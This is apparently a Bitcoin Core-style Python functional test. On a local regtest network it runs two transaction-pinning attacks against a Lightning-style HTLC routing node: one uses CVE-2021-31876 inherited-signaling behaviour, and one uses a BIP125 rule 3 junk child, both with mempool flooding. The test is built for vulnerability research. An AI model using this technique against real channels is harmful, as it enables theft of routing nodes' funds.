#!/usr/bin/env python3
# Copyright (c) 2015-2020 The Bitcoin Core developers
# Distributed under the MIT software license, see the accompanying
# file COPYING or http://www.opensource.org/licenses/mit-license.php.

"""Test transactions pinning attacks against Bitcoin contract protocols"""

from test_framework.test_framework import BitcoinTestFramework

from test_framework.address import script_to_p2wsh

from test_framework.util import (
        assert_equal,
        hex_str_to_bytes,
)

from test_framework.key import (
        ECKey,
        ECPubKey
)

from test_framework.messages import (
        CTransaction,
        CTxIn,
        CTxInWitness,
        CTxOut,
        COutPoint,
        COIN,
        sha256,
)

from test_framework.script import (
        CScript,
        hash160,
        OP_IF,
        OP_HASH160,
        OP_EQUAL,
        OP_ELSE,
        OP_ENDIF,
        OP_CHECKSIG,
        OP_SWAP,
        OP_SIZE,
        OP_NOTIF,
        OP_DROP,
        OP_CHECKMULTISIG,
        OP_EQUALVERIFY,
        OP_2,
        OP_0,
        OP_TRUE,
        SegwitV0SignatureHash,
        SIGHASH_ALL
)

from test_framework.wallet_util import bytes_to_wif

def get_funding_redeemscript(funder_pubkey, fundee_pubkey):
    return CScript([OP_2, funder_pubkey.get_bytes(), fundee_pubkey.get_bytes(), OP_2, OP_CHECKMULTISIG])

def generate_funding_chan(funder_node, coin, funder_pubkey, fundee_pubkey):
    witness_script = get_funding_redeemscript(funder_pubkey, fundee_pubkey)
    witness_program = sha256(witness_script)
    script_pubkey = CScript([OP_0, witness_program])

    funding_tx = CTransaction()
    funding_tx.vin.append(CTxIn(COutPoint(int(coin['txid'], 16), coin['vout']), b""))
    funding_tx.vout.append(CTxOut(int(9.99998 * COIN), script_pubkey))
    funding_tx.rehash()

    funding_signed = funder_node.signrawtransactionwithwallet(funding_tx.serialize().hex())['hex']
    return funding_signed

def update_chan_state(funder_node, funding_txid, funding_vout, funder_seckey, fundee_seckey, input_amount, input_script, sat_per_vbyte, timelock, hashlock, nSequence):
    witness_script = CScript([fundee_seckey.get_pubkey().get_bytes(), OP_SWAP, OP_SIZE, 32,
        OP_EQUAL, OP_NOTIF, OP_DROP, 2, OP_SWAP, funder_seckey.get_pubkey().get_bytes(), 2, OP_CHECKMULTISIG, OP_ELSE,
        OP_HASH160, hashlock, OP_EQUALVERIFY, OP_CHECKSIG, OP_ENDIF])
    witness_program = sha256(witness_script)
    script_pubkey = CScript([OP_0, witness_program])

    # Expected size = 158 vbyte
    commitment_fee = 158 * sat_per_vbyte
    commitment_tx = CTransaction()
    commitment_tx.vin.append(CTxIn(COutPoint(int(funding_txid, 16), funding_vout), b"", 0x1))
    commitment_tx.vout.append(CTxOut(int(input_amount - 158 * sat_per_vbyte), script_pubkey))

    sig_hash = SegwitV0SignatureHash(input_script, commitment_tx, 0, SIGHASH_ALL, int(input_amount))
    funder_sig = funder_seckey.sign_ecdsa(sig_hash) + b'\x01'
    fundee_sig = fundee_seckey.sign_ecdsa(sig_hash) + b'\x01'

    commitment_tx.wit.vtxinwit.append(CTxInWitness())
    commitment_tx.wit.vtxinwit[0].scriptWitness.stack = [b'', funder_sig, fundee_sig, input_script]
    commitment_tx.rehash()

    spend_script = CScript([OP_TRUE])
    spend_scriptpubkey = CScript([OP_0, sha256(spend_script)])

    # Expected size = 158 vbyte
    timeout_fee = 158 * sat_per_vbyte
    offerer_timeout = CTransaction()
    offerer_timeout.vin.append(CTxIn(COutPoint(int(commitment_tx.hash, 16), 0), b"", nSequence))
    offerer_timeout.vout.append(CTxOut(int(input_amount - (commitment_fee + timeout_fee)), spend_scriptpubkey))
    offerer_timeout.nLockTime = timelock

    sig_hash = SegwitV0SignatureHash(witness_script, offerer_timeout, 0, SIGHASH_ALL, commitment_tx.vout[0].nValue)
    funder_sig = funder_seckey.sign_ecdsa(sig_hash) + b'\x01'
    fundee_sig = fundee_seckey.sign_ecdsa(sig_hash) + b'\x01'

    offerer_timeout.wit.vtxinwit.append(CTxInWitness())
    offerer_timeout.wit.vtxinwit[0].scriptWitness.stack = [b'', fundee_sig, funder_sig, b'', witness_script]
    offerer_timeout.rehash()

    # Expected size = 148 vbyte
    preimage_fee = 148 * sat_per_vbyte
    receiver_preimage = CTransaction()
    receiver_preimage.vin.append(CTxIn(COutPoint(int(commitment_tx.hash, 16), 0), b"", nSequence))
    receiver_preimage.vout.append(CTxOut(int(input_amount - (commitment_fee + preimage_fee)), spend_scriptpubkey))

    sig_hash = SegwitV0SignatureHash(witness_script, receiver_preimage, 0, SIGHASH_ALL, commitment_tx.vout[0].nValue)
    fundee_sig = fundee_seckey.sign_ecdsa(sig_hash) + b'\x01'  # 0x1 is SIGHASH_ALL

    receiver_preimage.wit.vtxinwit.append(CTxInWitness())
    receiver_preimage.wit.vtxinwit[0].scriptWitness.stack = [fundee_sig, b'a' * 32, witness_script]
    receiver_preimage.rehash()

    return (commitment_tx, offerer_timeout, receiver_preimage)


def add_timeout_tx(commitment_txid, commitment_vout, commitment_value, timelock, sat_per_vbyte, funder_seckey, fundee_seckey):
    hashlock = hash160(b'a' * 32)
    spend_script = CScript([OP_TRUE])
    spend_scriptpubkey = CScript([OP_0, sha256(spend_script)])
    witness_script = CScript([fundee_seckey.get_pubkey().get_bytes(), OP_SWAP, OP_SIZE, 32,
        OP_EQUAL, OP_NOTIF, OP_DROP, 2, OP_SWAP, funder_seckey.get_pubkey().get_bytes(), 2, OP_CHECKMULTISIG, OP_ELSE,
        OP_HASH160, hashlock, OP_EQUALVERIFY, OP_CHECKSIG, OP_ENDIF])

    # Expected size = 158 vbyte
    timeout_fee = 158 * sat_per_vbyte
    offerer_timeout = CTransaction()
    offerer_timeout.vin.append(CTxIn(COutPoint(int(commitment_txid, 16), commitment_vout), b"", 0x1)) # This timeout signals repleacability
    offerer_timeout.vout.append(CTxOut(int(commitment_value - timeout_fee), spend_scriptpubkey))
    offerer_timeout.nLockTime = timelock

    sig_hash = SegwitV0SignatureHash(witness_script, offerer_timeout, 0, SIGHASH_ALL, commitment_value)
    funder_sig = funder_seckey.sign_ecdsa(sig_hash) + b'\x01'
    fundee_sig = fundee_seckey.sign_ecdsa(sig_hash) + b'\x01'

    offerer_timeout.wit.vtxinwit.append(CTxInWitness())
    offerer_timeout.wit.vtxinwit[0].scriptWitness.stack = [b'', fundee_sig, funder_sig, b'', witness_script]
    offerer_timeout.rehash()

    return offerer_timeout

def add_junk_child(parent_txid, parent_vout, parent_value, target_feerate, absolute_fee):
    spend_script = CScript([OP_TRUE])
    spend_scriptpubkey = CScript([OP_0, sha256(spend_script)])

    # Expected min size = 96 vbyte
    # Output size = 43 vbyte
    child_fee = 96 * 2 + absolute_fee
    to_add = int(absolute_fee / 43 / target_feerate - 1)
    child_tx = CTransaction()
    child_tx.vin.append(CTxIn(COutPoint(int(parent_txid, 16), parent_vout), b"", 0x1)) # This child signals repleacability
    for _ in range(to_add):
        child_tx.vout.append(CTxOut(330, spend_scriptpubkey))
    child_tx.vout.append(CTxOut(parent_value - child_fee - 330 * to_add, spend_scriptpubkey))

    child_tx.wit.vtxinwit.append(CTxInWitness())
    child_tx.wit.vtxinwit[0].scriptWitness.stack = [spend_script]

    return child_tx

def congestion_mempool(funder_node, coins, sat_per_vbyte, congestion_depth):

    txn = []

    witness_script = CScript([OP_TRUE])
    witness_program = sha256(witness_script)
    script_pubkey = CScript([OP_0, witness_program])

    # Expected size : 99059 vbyte / 396236 WU
    congestion_fee = 99059 * sat_per_vbyte
    # Expected size : 7381 vbyte / 29524 WU
    remainder_fee = 7381 * sat_per_vbyte
    for _ in range(congestion_depth):
        for _ in range(10):
            coin = coins.pop()
            congestion_tx = CTransaction()
            congestion_tx.vin.append(CTxIn(COutPoint(int(coin['txid'], 16), coin['vout']), b""))
            value_shard = 330 # Dust limit satoshis
            for _ in range(2299):
                congestion_tx.vout.append(CTxOut(int(value_shard), script_pubkey))
            congestion_tx.vout.append(CTxOut(int(coin['amount'] * COIN - congestion_fee - 2299 * value_shard), script_pubkey))
            congestion_tx.rehash()
            congestion_signed = funder_node.signrawtransactionwithwallet(congestion_tx.serialize().hex())['hex']
            txn.append(congestion_signed)
        # Blocks are 4_000_000 WU. Congestion txn are sized 396_236 WU (< MAX_STANDARD_TX_WEIGHT).
        # To congestion a whole block, add a remainder_tx sized 4000000 - 396236 * 10 ~= 37640.
        coin = coins.pop()
        remainder_tx = CTransaction()
        remainder_tx.vin.append(CTxIn(COutPoint(int(coin['txid'], 16), coin['vout']), b""))
        value_shard = 330 # Dust limit satoshis
        for _ in range(167):
            remainder_tx.vout.append(CTxOut(int(value_shard), script_pubkey))
        remainder_tx.vout.append(CTxOut(int(coin['amount'] * COIN - remainder_fee - 167 * value_shard), script_pubkey))
        remainder_tx.rehash()
        remainder_signed = funder_node.signrawtransactionwithwallet(remainder_tx.serialize().hex())['hex']
        txn.append(remainder_signed)

    return txn

class TxPinningTest(BitcoinTestFramework):
    def set_test_params(self):
        self.num_nodes = 3
        self.setup_clean_chain = True
        self.requires_wallet = True

    def test_preimage_pinning_nooptin(self):
        alice = self.nodes[0]
        alice_seckey = ECKey()
        alice_seckey.generate(True)

        bob = self.nodes[1]
        bob_seckey = ECKey()
        bob_seckey.generate(True)

        caroll = self.nodes[2]
        caroll_seckey = ECKey()
        caroll_seckey.generate(True)

        # Mine some blocks and have them mature
        alice.generate(501)

        self.sync_all()

        lastblockhash = alice.getbestblockhash()
        block = alice.getblock(lastblockhash)
        lastblockheight = block['height']

        self.connect_nodes(0, 1)
        self.connect_nodes(1, 2)

        # Establish payment channels between Alice and Bob, Bob and Caroll
        # To simplify, all transactions are funded by Alice
        coins = alice.listunspent()

        # Generate Alice and Bob funding tx
        coin_1 = coins.pop()
        ab_funding = generate_funding_chan(alice, coin_1, alice_seckey.get_pubkey(), bob_seckey.get_pubkey())

        # Generate Bob and Alice funding tx
        coin_2 = coins.pop()
        bc_funding = generate_funding_chan(alice, coin_2, bob_seckey.get_pubkey(), caroll_seckey.get_pubkey())

        # Propagage and confirm funding transactions
        ab_funding_txid = alice.sendrawtransaction(hexstring=ab_funding, maxfeerate=0)
        bc_funding_txid = bob.sendrawtransaction(hexstring=bc_funding, maxfeerate=0)

        self.sync_all()

        assert ab_funding_txid in alice.getrawmempool()
        assert bc_funding_txid in alice.getrawmempool()

        alice.generate(1)
        assert_equal(len(alice.getrawmempool()), 0)

        lastblockhash = alice.getbestblockhash()
        block = alice.getblock(lastblockhash)
        lastblockheight = block['height']

        hashlock = hash160(b'a' * 32)

        # Generate Alice and Bob next channel state
        funding_redeemscript = get_funding_redeemscript(alice_seckey.get_pubkey(), bob_seckey.get_pubkey())
        (ab_commitment_tx, alice_timeout_tx, bob_preimage_tx) = update_chan_state(alice, ab_funding_txid, 0, alice_seckey, bob_seckey, 9.99998 * COIN, funding_redeemscript, 2, lastblockheight + 20, hashlock, 0xffffffff)

        # Generate Bob and Caroll next channel state
        funding_redeemscript = get_funding_redeemscript(bob_seckey.get_pubkey(), caroll_seckey.get_pubkey())
        (bc_commitment_tx, bob_timeout_tx, caroll_preimage_tx) = update_chan_state(alice, bc_funding_txid, 0, bob_seckey, caroll_seckey, 9.99998 * COIN, funding_redeemscript, 2, lastblockheight + 10, hashlock, 0xffffffff)
        # Broadcast HTLC-pinning on Bob-Caroll channel
        bc_commitment_txid =  alice.sendrawtransaction(hexstring=bc_commitment_tx.serialize().hex(), maxfeerate=0)
        caroll_preimage_txid = alice.sendrawtransaction(hexstring=caroll_preimage_tx.serialize().hex(), maxfeerate=0)
        self.sync_all()

        assert bc_commitment_txid in alice.getrawmempool()
        assert caroll_preimage_txid in alice.getrawmempool()

        # Flood the mempool with 10 blocks to expire HTLC on Bob-Caroll link (CLTV=lastblockheight + 10)
        flooding_txn = []
        for i in range(10):
            flooding_txn += congestion_mempool(alice, coins, 5 + i * 2, 1) # Bump the feerate at each batch to avoid batch meddling at block construction
        assert_equal(len(flooding_txn), 11 * 10)

        for tx in flooding_txn:
            txid = alice.sendrawtransaction(hexstring=tx, maxfeerate=0)
        alice.generate(10)

        self.sync_all()

        # Verify that commitment and preimage transactions are still in Alice's mempool
        assert bc_commitment_txid in alice.getrawmempool()
        assert caroll_preimage_txid in alice.getrawmempool()

        # If Caroll's preimage has not been broadcast, Bob's timeout is ready for mempool acceptance
        #assert_equal(alice.testmempoolaccept(rawtxs=[bob_timeout_tx.serialize().hex()])[0]['allowed'], True)

        # Generate a Bob's timeout with bumped feerate to attempt to replace Caroll's preimage
        funding_redeemscript = get_funding_redeemscript(bob_seckey.get_pubkey(), caroll_seckey.get_pubkey())
        (bc_bumped_commitment_tx, _, _) = update_chan_state(alice, bc_funding_txid, 0, bob_seckey, caroll_seckey, 9.99998 * COIN, funding_redeemscript, 10, lastblockheight + 10, hashlock, 0xffffffff)
        bob_bumped_timeout_tx = add_timeout_tx(bc_commitment_txid, 0, int(9.99998 * COIN - 158 * 2), lastblockheight + 10, 10, bob_seckey, caroll_seckey)

        # Bob-Caroll previous state can be replaced in the mempool by a bumped one
        assert_equal(alice.testmempoolaccept(rawtxs=[bc_bumped_commitment_tx.serialize().hex()])[0]['allowed'], True)

        # CVE-2021-31876 : Bob's bumped timeout transaction (10 sat/vbyte) can't replace Caroll pinning transaction (2 sat/vbyte),
        # Core's mempool logic doesn't apply inherited signaling from bc_commitment_tx
        res = alice.testmempoolaccept(rawtxs=[bob_bumped_timeout_tx.serialize().hex()])[0]
        assert_equal(res['allowed'], False)
        assert_equal(res['reject-reason'], "txn-mempool-conflict")

        # Flood the mempool with 10 more blocks to expire HTLC on Alice-Bob link (CLTV=lastblockheight + 20)
        flooding_txn = []
        for i in range(10):
            flooding_txn += congestion_mempool(alice, coins, 5 + i * 2, 1) # Bump the feerate at each batch to avoid batch meddling at block construction
        assert_equal(len(flooding_txn), 11 * 10)

        for tx in flooding_txn:
            txid = alice.sendrawtransaction(hexstring=tx, maxfeerate=0)
        alice.generate(10)

        self.sync_all()

        # Verify that commitment and preimage transactions are still in Alice's mempool
        assert bc_commitment_txid in alice.getrawmempool()
        assert caroll_preimage_txid in alice.getrawmempool()

        # Broadcast Alice-Bob commitment tx and Alice's timeout, closing Alice-Bob channel
        ab_commitment_txid =  alice.sendrawtransaction(hexstring=ab_commitment_tx.serialize().hex(), maxfeerate=0)
        alice_timeout_txid = alice.sendrawtransaction(hexstring=alice_timeout_tx.serialize().hex(), maxfeerate=0)
        self.sync_all()

        assert ab_commitment_txid in alice.getrawmempool()
        assert alice_timeout_txid in alice.getrawmempool()

        # Confirm Alice-Bob commitment, Bob-Caroll commitment, Alice timeout tx, Caroll preimage tx...
        alice.generate(1)
        assert_equal(len(alice.getrawmempool()), 0)

        # Bob has paid forward the HTLC without claiming the corresponding HTLC backward.
        # Bob has lost 999997684 satoshis.

    def test_preimage_pinning_absfee(self):
        alice = self.nodes[0]
        alice_seckey = ECKey()
        alice_seckey.generate(True)

        bob = self.nodes[1]
        bob_seckey = ECKey()
        bob_seckey.generate(True)

        caroll = self.nodes[2]
        caroll_seckey = ECKey()
        caroll_seckey.generate(True)

        # Mine some blocks and have them mature
        alice.generate(501)

        self.sync_all()

        lastblockhash = alice.getbestblockhash()
        block = alice.getblock(lastblockhash)
        lastblockheight = block['height']

        self.connect_nodes(0, 1)
        self.connect_nodes(1, 2)

        # Establish payment channels between Alice and Bob, Bob and Caroll
        # To simplify, all transactions are funded by Alice
        coins = alice.listunspent()

        # Generate Alice and Bob funding tx
        coin_1 = coins.pop()
        ab_funding = generate_funding_chan(alice, coin_1, alice_seckey.get_pubkey(), bob_seckey.get_pubkey())

        # Generate Bob and Alice funding tx
        coin_2 = coins.pop()
        bc_funding = generate_funding_chan(alice, coin_2, bob_seckey.get_pubkey(), caroll_seckey.get_pubkey())

        # Propagage and confirm funding transactions
        ab_funding_txid = alice.sendrawtransaction(hexstring=ab_funding, maxfeerate=0)
        bc_funding_txid = bob.sendrawtransaction(hexstring=bc_funding, maxfeerate=0)

        self.sync_all()

        assert ab_funding_txid in alice.getrawmempool()
        assert bc_funding_txid in alice.getrawmempool()

        alice.generate(1)
        assert_equal(len(alice.getrawmempool()), 0)

        lastblockhash = alice.getbestblockhash()
        block = alice.getblock(lastblockhash)
        lastblockheight = block['height']

        hashlock = hash160(b'a' * 32)

        # Generate Alice and Bob next channel state
        funding_redeemscript = get_funding_redeemscript(alice_seckey.get_pubkey(), bob_seckey.get_pubkey())
        (ab_commitment_tx, alice_timeout_tx, bob_preimage_tx) = update_chan_state(alice, ab_funding_txid, 0, alice_seckey, bob_seckey, 9.99998 * COIN, funding_redeemscript, 2, lastblockheight + 20, hashlock, 0x1)

        # Generate Bob and Caroll next channel state
        funding_redeemscript = get_funding_redeemscript(bob_seckey.get_pubkey(), caroll_seckey.get_pubkey())
        (bc_commitment_tx, bob_timeout_tx, caroll_preimage_tx) = update_chan_state(alice, bc_funding_txid, 0, bob_seckey, caroll_seckey, 9.99998 * COIN, funding_redeemscript, 2, lastblockheight + 10, hashlock, 0x1)
        # Broadcast HTLC-pinning on Bob-Caroll channel
        bc_commitment_txid =  alice.sendrawtransaction(hexstring=bc_commitment_tx.serialize().hex(), maxfeerate=0)
        caroll_preimage_txid = alice.sendrawtransaction(hexstring=caroll_preimage_tx.serialize().hex(), maxfeerate=0)
        self.sync_all()

        assert bc_commitment_txid in alice.getrawmempool()
        assert caroll_preimage_txid in alice.getrawmempool()

        # Flood the mempool with 10 blocks to expire HTLC on Bob-Caroll link (CLTV=lastblockheight + 10)
        flooding_txn = []
        for i in range(10):
            flooding_txn += congestion_mempool(alice, coins, 5 + i * 2, 1) # Bump the feerate at each batch to avoid batch meddling at block construction
        assert_equal(len(flooding_txn), 11 * 10)

        for tx in flooding_txn:
            txid = alice.sendrawtransaction(hexstring=tx, maxfeerate=0)
        alice.generate(10)

        self.sync_all()

        # Verify that commitment and preimage transactions are still in Alice's mempool
        assert bc_commitment_txid in alice.getrawmempool()
        assert caroll_preimage_txid in alice.getrawmempool()

        # If Caroll's preimage has not been broadcast, Bob's timeout is ready for mempool acceptance
        #assert_equal(alice.testmempoolaccept(rawtxs=[bob_timeout_tx.serialize().hex()])[0]['allowed'], True)

        # Generate a Bob's timeout with bumped feerate to attempt to replace Caroll's preimage
        funding_redeemscript = get_funding_redeemscript(bob_seckey.get_pubkey(), caroll_seckey.get_pubkey())
        (bc_bumped_commitment_tx, _, _) = update_chan_state(alice, bc_funding_txid, 0, bob_seckey, caroll_seckey, 9.99998 * COIN, funding_redeemscript, 10, lastblockheight + 10, hashlock, 0xffffffff)
        bob_bumped_timeout_tx = add_timeout_tx(bc_commitment_txid, 0, int(9.99998 * COIN - 158 * 2), lastblockheight + 10, 10, bob_seckey, caroll_seckey)

        # Bob-Caroll previous state can be replaced in the mempool by a bumped one
        assert_equal(alice.testmempoolaccept(rawtxs=[bc_bumped_commitment_tx.serialize().hex()])[0]['allowed'], True)

        # Generate a junk child to Caroll's preimage_tx to prevent replacement by leveraging bip125 rule 3
        junk_child_tx = add_junk_child(caroll_preimage_txid, 0, int(9.99998 * COIN - 158 * 2 - 148 * 2), 2, 2000)

        # Pin the preimage tx with the junk child
        junk_child_txid = alice.sendrawtransaction(hexstring=junk_child_tx.serialize().hex(), maxfeerate=0)

        assert junk_child_txid in alice.getrawmempool()

        # RBF Pinning with Counterparties and Competing Interest : https://lists.linuxfoundation.org/pipermail/lightning-dev/2020-April/002639.html
        # Bob's bumped timeout transaction (10 sat/vbyte, absolute_fee=1480 sat) can't replace Caroll pinning transaction and its child (absolute_fee=2296 sat)
        # Core's logic mempool apply bip125 rule 3.
        res = alice.testmempoolaccept(rawtxs=[bob_bumped_timeout_tx.serialize().hex()])[0]
        assert_equal(res['allowed'], False)
        assert_equal(res['reject-reason'], "insufficient fee")

        # Flood the mempool with 10 more blocks to expire HTLC on Alice-Bob link (CLTV=lastblockheight + 20)
        flooding_txn = []
        for i in range(10):
            flooding_txn += congestion_mempool(alice, coins, 5 + i * 2, 1) # Bump the feerate at each batch to avoid batch meddling at block construction
        assert_equal(len(flooding_txn), 11 * 10)

        for tx in flooding_txn:
            txid = alice.sendrawtransaction(hexstring=tx, maxfeerate=0)
        alice.generate(10)

        self.sync_all()

        # Verify that commitment and preimage transactions are still in Alice's mempool
        assert bc_commitment_txid in alice.getrawmempool()
        assert caroll_preimage_txid in alice.getrawmempool()
        assert junk_child_txid in alice.getrawmempool()

        # Broadcast Alice-Bob commitment tx and Alice's timeout, closing Alice-Bob channel
        ab_commitment_txid =  alice.sendrawtransaction(hexstring=ab_commitment_tx.serialize().hex(), maxfeerate=0)
        alice_timeout_txid = alice.sendrawtransaction(hexstring=alice_timeout_tx.serialize().hex(), maxfeerate=0)
        self.sync_all()

        assert ab_commitment_txid in alice.getrawmempool()
        assert alice_timeout_txid in alice.getrawmempool()

        # Confirm Alice-Bob commitment, Bob-Caroll commitment, Alice timeout tx, Caroll preimage tx...
        alice.generate(1)
        assert_equal(len(alice.getrawmempool()), 0)

        # Bob has paid forward the HTLC without claiming the corresponding HTLC backward.
        # Bob has lost 999997684 satoshis.

    def run_test(self):
        # First scenario illustrates a pinning attack against a HTLC routing node, as described in "RBF Pinning with Counterparties and Competing Interest"
        # Second scenario illustrates a pinning attack against a HTLC routing node, leveraging bip125 defect about inherited signaling (CVE-2021-31876)
        # This latter scenario comes up with the following trade-offs:
        # + cheaper : attacker doesn't have to commit an absolute fee better than a honest replacement candidate
        # + efficient : corollary, a lower absolute fee decrease odds of pinning inclusion in a block
        # - parent-dependent : if the parent transaction confirms, pinning persistence only perserveres if the pinning tx itself opted out
        self.test_preimage_pinning_absfee()
        self.test_preimage_pinning_nooptin()

if __name__ == '__main__':
    TxPinningTest().main()
